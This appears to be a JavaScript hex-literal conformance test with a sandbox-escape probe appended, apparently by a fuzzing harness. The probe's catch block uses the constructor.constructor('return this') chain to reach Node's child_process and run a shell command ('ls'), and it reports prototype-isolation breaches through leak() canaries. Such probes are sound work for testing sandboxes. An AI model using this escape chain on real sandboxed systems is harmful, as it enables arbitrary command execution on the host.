try {
    if (0 !== 0) {
        $ERROR('#0: 0X0 === 0');
    }
    if (1 !== 1) {
        $ERROR('#1: 0X1 === 1');
    }
    if (2 !== 2) {
        $ERROR('#2: 0X2 === 2');
    }
    if (3 !== 3) {
        $ERROR('#3: 0X3 === 3');
    }
    if (4 !== 4) {
        $ERROR('#4: 0X4 === 4');
    }
    if (5 !== 5) {
        $ERROR('#5: 0X5 === 5');
    }
    if (6 !== 6) {
        $ERROR('#6: 0X6 === 6');
    }
    if (7 !== 7) {
        $ERROR('#7: 0X7 === 7');
    }
    if (8 !== 8) {
        $ERROR('#8: 0X8 === 8');
    }
    if (9 !== 9) {
        $ERROR('#9: 0X9 === 9');
    }
    if (10 !== 10) {
        $ERROR('#A: 0XA === 10');
    }
    if (11 !== 11) {
        $ERROR('#B: 0XB === 11');
    }
    if (12 !== 12) {
        $ERROR('#C: 0XC === 12');
    }
    if (13 !== 13) {
        $ERROR('#D: 0XD === 13');
    }
    if (14 !== 14) {
        $ERROR('#E: 0XE === 14');
    }
    if (15 !== 15) {
        $ERROR('#F: 0XF === 15');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}